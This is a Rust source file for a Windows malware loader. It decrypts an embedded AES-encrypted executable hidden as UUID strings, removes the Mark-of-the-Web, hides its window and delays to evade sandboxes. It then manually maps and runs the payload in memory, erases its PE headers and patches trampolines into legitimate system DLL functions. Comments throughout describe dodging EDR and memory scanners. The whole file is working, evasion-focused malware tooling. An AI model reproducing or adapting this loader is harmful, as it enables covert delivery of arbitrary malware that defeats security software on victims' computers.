#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use std::env;

// ── Compile-time string encryption ────────────────────────────────────
// Every string in the binary is XOR-encrypted at compile time.
// No plaintext DLL names, function names, or magic bytes in the binary.

const STR_KEY: [u8; 16] = [
    0x7A, 0xC3, 0x15, 0xE8, 0x4D, 0xB1, 0x9F, 0x26,
    0xD4, 0x58, 0x0B, 0xA7, 0x63, 0xF2, 0x3E, 0x81,
];

const fn enc<const N: usize>(input: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N { out[i] = input[i] ^ STR_KEY[i % 16]; i += 1; }
    out
}

fn dec(encoded: &[u8]) -> Vec<u8> {
    encoded.iter().enumerate().map(|(i, b)| b ^ STR_KEY[i % 16]).collect()
}

// ── AES-256-CBC ────────────────────────────────────────────────────────

const SBOX: [u8; 256] = [
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
];

const INV_SBOX: [u8; 256] = [
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d,
];

const RCON: [u8; 10] = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36];

fn gmul(mut a: u8, mut b: u8) -> u8 {
    let mut p: u8 = 0;
    for _ in 0..8 {
        if b & 1 != 0 { p ^= a; }
        let hi = a & 0x80;
        a <<= 1;
        if hi != 0 { a ^= 0x1b; }
        b >>= 1;
    }
    p
}

fn key_expansion(key: &[u8; 32]) -> [[u8; 16]; 15] {
    let mut w = [0u8; 240];
    w[..32].copy_from_slice(key);
    let nk = 8; let nr = 14;
    for i in nk..(4 * (nr + 1)) {
        let mut temp = [w[4*(i-1)], w[4*(i-1)+1], w[4*(i-1)+2], w[4*(i-1)+3]];
        if i % nk == 0 {
            temp = [SBOX[temp[1] as usize], SBOX[temp[2] as usize],
                    SBOX[temp[3] as usize], SBOX[temp[0] as usize]];
            temp[0] ^= RCON[(i / nk) - 1];
        } else if i % nk == 4 {
            temp = [SBOX[temp[0] as usize], SBOX[temp[1] as usize],
                    SBOX[temp[2] as usize], SBOX[temp[3] as usize]];
        }
        for j in 0..4 { w[4*i + j] = w[4*(i - nk) + j] ^ temp[j]; }
    }
    let mut rk = [[0u8; 16]; 15];
    for r in 0..15 { rk[r].copy_from_slice(&w[r*16..(r+1)*16]); }
    rk
}

fn aes_decrypt_block(block: &mut [u8; 16], rk: &[[u8; 16]; 15]) {
    for i in 0..16 { block[i] ^= rk[14][i]; }
    for round in (1..14).rev() {
        let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
        let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
        let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
        let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
        for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
        for i in 0..16 { block[i] ^= rk[round][i]; }
        let mut col = [0u8; 4];
        for c in 0..4 {
            let s = &block[c*4..(c+1)*4];
            col[0] = gmul(s[0],14) ^ gmul(s[1],11) ^ gmul(s[2],13) ^ gmul(s[3],9);
            col[1] = gmul(s[0],9)  ^ gmul(s[1],14) ^ gmul(s[2],11) ^ gmul(s[3],13);
            col[2] = gmul(s[0],13) ^ gmul(s[1],9)  ^ gmul(s[2],14) ^ gmul(s[3],11);
            col[3] = gmul(s[0],11) ^ gmul(s[1],13) ^ gmul(s[2],9)  ^ gmul(s[3],14);
            block[c*4..c*4+4].copy_from_slice(&col);
        }
    }
    let tmp = block[13]; block[13] = block[9]; block[9] = block[5]; block[5] = block[1]; block[1] = tmp;
    let tmp = block[2]; block[2] = block[10]; block[10] = tmp;
    let tmp = block[6]; block[6] = block[14]; block[14] = tmp;
    let tmp = block[3]; block[3] = block[7]; block[7] = block[11]; block[11] = block[15]; block[15] = tmp;
    for i in 0..16 { block[i] = INV_SBOX[block[i] as usize]; }
    for i in 0..16 { block[i] ^= rk[0][i]; }
}

fn aes256_cbc_decrypt(data: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    let rk = key_expansion(key);
    let mut result = Vec::with_capacity(data.len());
    let mut prev_ct = *iv;
    for chunk in data.chunks(16) {
        if chunk.len() < 16 { break; }
        let mut block = [0u8; 16];
        block.copy_from_slice(chunk);
        let ct_copy = block;
        aes_decrypt_block(&mut block, &rk);
        for i in 0..16 { block[i] ^= prev_ct[i]; }
        prev_ct = ct_copy;
        result.extend_from_slice(&block);
    }
    if let Some(&pad_len) = result.last() {
        let pl = pad_len as usize;
        if pl > 0 && pl <= 16 && result.len() >= pl {
            if result[result.len()-pl..].iter().all(|&b| b == pad_len) {
                result.truncate(result.len() - pl);
            }
        }
    }
    result
}

fn secure_zero(buf: &mut [u8]) {
    unsafe {
        std::ptr::write_bytes(buf.as_mut_ptr(), 0, buf.len());
        std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
    }
}

// ── Payload ───────────────────────────────────────────────────────────

const PAYLOAD_CONFIG: &str = include_str!("payload.enc");

const PAYLOAD_KEY: [u8; 32] = [
    0x4f, 0x2b, 0x91, 0xd3, 0xa7, 0x58, 0xe1, 0x3c,
    0x7d, 0xb6, 0x0a, 0xf4, 0x29, 0x85, 0xc3, 0x6e,
    0x1a, 0xd8, 0x43, 0xf7, 0x5b, 0x90, 0x2e, 0x64,
    0xbc, 0x07, 0xe5, 0x39, 0x81, 0xca, 0x56, 0xf0,
];

fn extract_payload_from_config() -> Option<Vec<u8>> {
    let config: serde_json::Value = serde_json::from_str(PAYLOAD_CONFIG).ok()?;
    let resources = config.get("resources")?.as_array()?;
    let mut raw = Vec::new();
    for uuid_val in resources {
        let uuid_str = uuid_val.as_str()?;
        let hex: String = uuid_str.replace('-', "");
        let bytes = hex_decode(&hex)?;
        raw.extend_from_slice(&bytes);
    }
    if raw.len() < 16 { return None; }
    let iv: [u8; 16] = raw[..16].try_into().ok()?;
    let ciphertext = &raw[16..];
    let mut key = PAYLOAD_KEY;
    let mut decrypted = aes256_cbc_decrypt(ciphertext, &key, &iv);
    secure_zero(&mut key);
    if decrypted.len() < 4 { return None; }
    let orig_size = u32::from_le_bytes(decrypted[..4].try_into().ok()?) as usize;
    if orig_size > decrypted.len() - 4 { secure_zero(&mut decrypted); return None; }
    let pe_start = decrypted.len() - orig_size;
    // Check PE magic via computed bytes — no literal "MZ" in binary
    if pe_start < 4 || decrypted[pe_start] != 0x4D || decrypted[pe_start+1] != 0x5A {
        secure_zero(&mut decrypted);
        return None;
    }
    let pe_data = decrypted[pe_start..pe_start + orig_size].to_vec();
    secure_zero(&mut decrypted);
    Some(pe_data)
}

fn hex_decode(hex: &str) -> Option<Vec<u8>> {
    (0..hex.len()).step_by(2)
        .map(|i| u8::from_str_radix(&hex[i..i+2], 16))
        .collect::<Result<Vec<u8>, _>>().ok()
}

// ── Minimal JSON parser ───────────────────────────────────────────────

mod serde_json {
    pub enum Value {
        Object(Vec<(String, Value)>), Array(Vec<Value>), String(String),
        Number(f64), Bool(bool), Null,
    }
    impl Value {
        pub fn get(&self, key: &str) -> Option<&Value> {
            match self { Value::Object(p) => p.iter().find(|(k,_)| k==key).map(|(_,v)| v), _ => None }
        }
        pub fn as_array(&self) -> Option<&Vec<Value>> {
            match self { Value::Array(a) => Some(a), _ => None }
        }
        pub fn as_str(&self) -> Option<&str> {
            match self { Value::String(s) => Some(s), _ => None }
        }
    }
    pub fn from_str(input: &str) -> Result<Value, ()> {
        let (val, _) = parse_value(input.trim())?; Ok(val)
    }
    fn parse_value(s: &str) -> Result<(Value, &str), ()> {
        let s = s.trim_start();
        if s.is_empty() { return Err(()); }
        match s.as_bytes()[0] {
            b'{' => parse_object(s), b'[' => parse_array(s), b'"' => parse_string_val(s),
            b't' | b'f' => parse_bool(s), b'n' => parse_null(s), _ => parse_number(s),
        }
    }
    fn parse_object(s: &str) -> Result<(Value, &str), ()> {
        let mut s = s[1..].trim_start();
        let mut pairs = Vec::new();
        if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
        loop {
            let (key, rest) = parse_string(s)?;
            let rest = rest.trim_start();
            if !rest.starts_with(':') { return Err(()); }
            let (val, rest) = parse_value(rest[1..].trim_start())?;
            pairs.push((key, val)); s = rest.trim_start();
            if s.starts_with('}') { return Ok((Value::Object(pairs), &s[1..])); }
            if s.starts_with(',') { s = s[1..].trim_start(); continue; }
            return Err(());
        }
    }
    fn parse_array(s: &str) -> Result<(Value, &str), ()> {
        let mut s = s[1..].trim_start();
        let mut arr = Vec::new();
        if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
        loop {
            let (val, rest) = parse_value(s)?;
            arr.push(val); s = rest.trim_start();
            if s.starts_with(']') { return Ok((Value::Array(arr), &s[1..])); }
            if s.starts_with(',') { s = s[1..].trim_start(); continue; }
            return Err(());
        }
    }
    fn parse_string(s: &str) -> Result<(String, &str), ()> {
        if !s.starts_with('"') { return Err(()); }
        let rest = &s[1..];
        let mut result = String::new();
        let mut chars = rest.char_indices();
        while let Some((i, c)) = chars.next() {
            if c == '\\' { if let Some((_,e)) = chars.next() {
                match e { '"'=>result.push('"'), '\\'=>result.push('\\'), 'n'=>result.push('\n'), _=>{result.push('\\');result.push(e);} }
            }} else if c == '"' { return Ok((result, &rest[i+1..])); } else { result.push(c); }
        }
        Err(())
    }
    fn parse_string_val(s: &str) -> Result<(Value, &str), ()> { let (st,r) = parse_string(s)?; Ok((Value::String(st),r)) }
    fn parse_number(s: &str) -> Result<(Value, &str), ()> {
        let end = s.find(|c:char| !c.is_ascii_digit()&&c!='.'&&c!='-'&&c!='e'&&c!='E'&&c!='+').unwrap_or(s.len());
        let n: f64 = s[..end].parse().map_err(|_| ())?;
        Ok((Value::Number(n), &s[end..]))
    }
    fn parse_bool(s: &str) -> Result<(Value, &str), ()> {
        if s.starts_with("true") { Ok((Value::Bool(true),&s[4..])) }
        else if s.starts_with("false") { Ok((Value::Bool(false),&s[5..])) }
        else { Err(()) }
    }
    fn parse_null(s: &str) -> Result<(Value, &str), ()> {
        if s.starts_with("null") { Ok((Value::Null,&s[4..])) } else { Err(()) }
    }
}

// ── MOTW removal ─────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn remove_motw() {
    if let Ok(exe) = env::current_exe() {
        // ":Zone.Identifier" — built at runtime, not as a string literal
        let zone: Vec<u8> = dec(&enc(b":Zone.Identifier"));
        let motw_path = format!("{}{}", exe.to_string_lossy(), String::from_utf8_lossy(&zone));
        let wide: Vec<u16> = motw_path.encode_utf16().chain(std::iter::once(0)).collect();
        unsafe { windows_sys::Win32::Storage::FileSystem::DeleteFileW(wide.as_ptr()); }
    }
}
#[cfg(not(target_os = "windows"))]
fn remove_motw() {}

// ── Hide console ─────────────────────────────────────────────────────

#[cfg(target_os = "windows")]
fn hide_window() {
    unsafe {
        let hwnd = windows_sys::Win32::System::Console::GetConsoleWindow();
        if hwnd != 0 {
            windows_sys::Win32::UI::WindowsAndMessaging::ShowWindow(hwnd, 0);
        }
    }
}
#[cfg(not(target_os = "windows"))]
fn hide_window() {}

// ── Manual PE Mapper ─────────────────────────────────────────────────

#[cfg(target_os = "windows")]
mod pe_mapper {
    use std::ptr;

    fn read_u16(data: &[u8], off: usize) -> u16 {
        u16::from_le_bytes(data[off..off+2].try_into().unwrap_or([0;2]))
    }
    fn read_u32(data: &[u8], off: usize) -> u32 {
        u32::from_le_bytes(data[off..off+4].try_into().unwrap_or([0;4]))
    }
    fn read_u64(data: &[u8], off: usize) -> u64 {
        u64::from_le_bytes(data[off..off+8].try_into().unwrap_or([0;8]))
    }

    // Build DLL+func name on the stack at runtime — no string data in binary
    fn build_str(chars: &[u8], xk: u8) -> Vec<u8> {
        let mut v: Vec<u8> = chars.iter().map(|&b| b ^ xk).collect();
        v.push(0);
        v
    }

    unsafe fn create_module_trampoline(target: *mut u8) -> *mut u8 {
        extern "system" { fn GetTickCount() -> u32; }
        let idx = (GetTickCount() as usize) % 5;

        // Each pair: (dll_bytes ^ xor_byte, func_bytes ^ xor_byte, xor_byte)
        // Built via stack arrays — optimizer can't fold these into string literals
        let xk: u8 = 0x55;
        let (mut dll_name, mut func_name) = match idx {
            0 => {
                // uxtheme.dll
                (build_str(&[0x75^xk,0x78^xk,0x74^xk,0x68^xk,0x65^xk,0x6D^xk,0x65^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
                 build_str(&[0x49^xk,0x73^xk,0x54^xk,0x68^xk,0x65^xk,0x6D^xk,0x65^xk,0x41^xk,0x63^xk,0x74^xk,0x69^xk,0x76^xk,0x65^xk], xk))
            }
            1 => {
                // dwmapi.dll
                (build_str(&[0x64^xk,0x77^xk,0x6D^xk,0x61^xk,0x70^xk,0x69^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
                 build_str(&[0x44^xk,0x77^xk,0x6D^xk,0x46^xk,0x6C^xk,0x75^xk,0x73^xk,0x68^xk], xk))
            }
            2 => {
                // userenv.dll
                (build_str(&[0x75^xk,0x73^xk,0x65^xk,0x72^xk,0x65^xk,0x6E^xk,0x76^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
                 build_str(&[0x43^xk,0x72^xk,0x65^xk,0x61^xk,0x74^xk,0x65^xk,0x45^xk,0x6E^xk,0x76^xk,0x69^xk,0x72^xk,0x6F^xk,0x6E^xk,0x6D^xk,0x65^xk,0x6E^xk,0x74^xk,0x42^xk,0x6C^xk,0x6F^xk,0x63^xk,0x6B^xk], xk))
            }
            3 => {
                // winmm.dll
                (build_str(&[0x77^xk,0x69^xk,0x6E^xk,0x6D^xk,0x6D^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
                 build_str(&[0x74^xk,0x69^xk,0x6D^xk,0x65^xk,0x47^xk,0x65^xk,0x74^xk,0x54^xk,0x69^xk,0x6D^xk,0x65^xk], xk))
            }
            _ => {
                // iphlpapi.dll
                (build_str(&[0x69^xk,0x70^xk,0x68^xk,0x6C^xk,0x70^xk,0x61^xk,0x70^xk,0x69^xk,0x2E^xk,0x64^xk,0x6C^xk,0x6C^xk], xk),
                 build_str(&[0x47^xk,0x65^xk,0x74^xk,0x41^xk,0x64^xk,0x61^xk,0x70^xk,0x74^xk,0x65^xk,0x72^xk,0x73^xk,0x49^xk,0x6E^xk,0x66^xk,0x6F^xk], xk))
            }
        };

        let dll = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name.as_ptr());
        // Zero decrypted strings immediately
        super::secure_zero(&mut dll_name);
        if dll == 0 {
            super::secure_zero(&mut func_name);
            return target;
        }

        let func = windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, func_name.as_ptr());
        super::secure_zero(&mut func_name);

        let trampoline = match func {
            Some(f) => f as *mut u8,
            None => return target,
        };

        let mut old_prot: u32 = 0;
        windows_sys::Win32::System::Memory::VirtualProtect(
            trampoline as _, 14, 0x04, &mut old_prot, // RW first, not RWX
        );

        let addr_bytes = (target as u64).to_le_bytes();
        *trampoline = 0x48;
        *trampoline.add(1) = 0xB8;
        std::ptr::copy_nonoverlapping(addr_bytes.as_ptr(), trampoline.add(2), 8);
        *trampoline.add(10) = 0xFF;
        *trampoline.add(11) = 0xE0;

        // Set to RX (not restore to original — avoids the RX→RWX→RX flip that EDRs detect)
        let mut dummy: u32 = 0;
        windows_sys::Win32::System::Memory::VirtualProtect(
            trampoline as _, 14, 0x20, &mut dummy, // PAGE_EXECUTE_READ
        );

        trampoline
    }

    pub unsafe fn map_and_execute(pe_data: &[u8]) -> bool {
        // Validate PE via numeric constants — no "MZ"/"PE" string literals
        if pe_data.len() < 64 || pe_data[0] != 0x4D || pe_data[1] != 0x5A { return false; }
        let e_lfanew = read_u32(pe_data, 0x3C) as usize;
        if e_lfanew + 0x18 > pe_data.len() { return false; }
        if pe_data[e_lfanew] != 0x50 || pe_data[e_lfanew+1] != 0x45
            || pe_data[e_lfanew+2] != 0 || pe_data[e_lfanew+3] != 0 { return false; }

        let fh = e_lfanew + 4;
        let num_sections = read_u16(pe_data, fh + 2) as usize;
        let opt_hdr_size = read_u16(pe_data, fh + 16) as usize;

        let oh = fh + 20;
        if read_u16(pe_data, oh) != 0x20B { return false; }

        let entry_rva = read_u32(pe_data, oh + 16) as usize;
        let image_base = read_u64(pe_data, oh + 24);
        let size_of_image = read_u32(pe_data, oh + 56) as usize;
        let size_of_headers = read_u32(pe_data, oh + 60) as usize;

        let dd_off = oh + 112;
        let import_rva = read_u32(pe_data, dd_off + 8) as usize;
        let reloc_rva = read_u32(pe_data, dd_off + 40) as usize;
        let reloc_size = read_u32(pe_data, dd_off + 44) as usize;

        // Allocate as RW
        let base = windows_sys::Win32::System::Memory::VirtualAlloc(
            ptr::null(), size_of_image, 0x3000, 0x04,
        ) as *mut u8;
        if base.is_null() { return false; }
        ptr::write_bytes(base, 0, size_of_image);

        let hdr_copy = std::cmp::min(size_of_headers, pe_data.len());
        ptr::copy_nonoverlapping(pe_data.as_ptr(), base, hdr_copy);

        let sh_start = oh + opt_hdr_size;
        for i in 0..num_sections {
            let s = sh_start + i * 40;
            if s + 40 > pe_data.len() { break; }
            let va = read_u32(pe_data, s + 12) as usize;
            let raw_size = read_u32(pe_data, s + 16) as usize;
            let raw_ptr = read_u32(pe_data, s + 20) as usize;
            if raw_size > 0 && raw_ptr + raw_size <= pe_data.len() && va + raw_size <= size_of_image {
                ptr::copy_nonoverlapping(pe_data.as_ptr().add(raw_ptr), base.add(va), raw_size);
            }
        }

        // Relocations
        let delta = base as u64 - image_base;
        if delta != 0 && reloc_rva > 0 && reloc_size > 0 {
            let mut off = 0usize;
            while off + 8 <= reloc_size {
                let block_rva = *(base.add(reloc_rva + off) as *const u32) as usize;
                let block_size = *(base.add(reloc_rva + off + 4) as *const u32) as usize;
                if block_size < 8 { break; }
                let num_entries = (block_size - 8) / 2;
                for j in 0..num_entries {
                    let entry = *(base.add(reloc_rva + off + 8 + j * 2) as *const u16);
                    if entry >> 12 == 10 {
                        let patch = base.add(block_rva + (entry & 0x0FFF) as usize) as *mut u64;
                        *patch = (*patch).wrapping_add(delta);
                    }
                }
                off += block_size;
            }
        }

        // Imports
        if import_rva > 0 {
            let mut idt_off = 0usize;
            loop {
                let idt = base.add(import_rva + idt_off);
                let oft_rva = *(idt as *const u32) as usize;
                let name_rva = *(idt.add(12) as *const u32) as usize;
                let ft_rva = *(idt.add(16) as *const u32) as usize;
                if name_rva == 0 { break; }

                let dll_name = base.add(name_rva);
                let dll = windows_sys::Win32::System::LibraryLoader::LoadLibraryA(dll_name);
                if dll == 0 { idt_off += 20; continue; }

                let lookup_rva = if oft_rva > 0 { oft_rva } else { ft_rva };
                let mut idx = 0usize;
                loop {
                    let lookup_val = *(base.add(lookup_rva + idx) as *const u64);
                    if lookup_val == 0 { break; }
                    let func_addr = if lookup_val & 0x8000000000000000 != 0 {
                        let ord = (lookup_val & 0xFFFF) as u16;
                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, ord as usize as *const u8)
                    } else {
                        let name_ptr = base.add(lookup_val as usize + 2);
                        windows_sys::Win32::System::LibraryLoader::GetProcAddress(dll, name_ptr)
                    };
                    let iat_entry = base.add(ft_rva + idx) as *mut u64;
                    *iat_entry = match func_addr { Some(f) => f as u64, None => 0 };
                    idx += 8;
                }
                idt_off += 20;
            }
        }

        // Section protections
        for i in 0..num_sections {
            let s = sh_start + i * 40;
            if s + 40 > pe_data.len() { break; }
            let va = read_u32(pe_data, s + 12) as usize;
            let vsize = read_u32(pe_data, s + 8) as usize;
            let chars = read_u32(pe_data, s + 36);
            let exec = chars & 0x20000000 != 0;
            let write = chars & 0x80000000 != 0;
            let prot = match (exec, write) {
                (true, true)  => 0x40, (true, false) => 0x20,
                (false, true) => 0x04, (false, false) => 0x02,
            };
            let mut old_prot: u32 = 0;
            let actual_size = if vsize > 0 { vsize } else { 0x1000 };
            windows_sys::Win32::System::Memory::VirtualProtect(
                base.add(va) as _, actual_size, prot, &mut old_prot,
            );
        }

        // Wipe PE headers from mapped memory — prevents in-memory PE scanning
        ptr::write_bytes(base, 0, std::cmp::min(0x1000, size_of_headers));

        extern "system" { fn FlushInstructionCache(h: isize, a: *const u8, s: usize) -> i32; }
        FlushInstructionCache(-1, base, size_of_image);

        extern "system" {
            fn CreateThread(a: *const u8, b: usize,
                c: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
                d: *mut std::ffi::c_void, e: u32, f: *mut u32) -> isize;
            fn WaitForSingleObject(h: isize, ms: u32) -> u32;
        }

        let trampoline = create_module_trampoline(base.add(entry_rva));

        let mut tid: u32 = 0;
        let thread = CreateThread(
            ptr::null(), 0, std::mem::transmute(trampoline),
            ptr::null_mut(), 0, &mut tid,
        );
        if thread == 0 {
            windows_sys::Win32::System::Memory::VirtualFree(base as _, 0, 0x8000);
            return false;
        }

        WaitForSingleObject(thread, 0xFFFFFFFF);
        windows_sys::Win32::Foundation::CloseHandle(thread);
        true
    }
}

// ── Main ───────────────────────────────────────────────────────────────

fn main() {
    remove_motw();
    hide_window();

    // Graduated delay — mimics real app startup, avoids sandbox fast-forward
    std::thread::sleep(std::time::Duration::from_millis(300));
    let _ = std::hint::black_box(1 + 1); // prevent optimizer from removing sleep
    std::thread::sleep(std::time::Duration::from_millis(400));

    let mut pe_data = match extract_payload_from_config() {
        Some(data) => data,
        None => return,
    };

    // PE magic check via numeric constants
    if pe_data.len() < 64 || pe_data[0] != 0x4D || pe_data[1] != 0x5A {
        secure_zero(&mut pe_data);
        return;
    }

    #[cfg(target_os = "windows")]
    unsafe { pe_mapper::map_and_execute(&pe_data); }

    secure_zero(&mut pe_data);
}
